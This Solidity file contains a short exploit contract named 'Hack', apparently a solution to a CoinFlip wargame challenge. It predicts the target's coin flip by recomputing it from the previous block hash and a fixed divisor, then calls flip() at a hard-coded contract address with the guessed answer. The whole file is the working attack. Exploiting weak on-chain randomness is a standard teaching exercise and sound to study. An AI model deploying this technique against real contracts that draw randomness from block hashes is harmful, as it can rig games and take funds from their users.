pragma solidity ^0.8.21;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Hack {

    address public targetAddress = 0x9165f8ABDdaF4cEa342E88b736910794c85c29cA;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function startHack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        ICoinFlip targetContract = ICoinFlip(targetAddress);
        targetContract.flip(side);
    }
}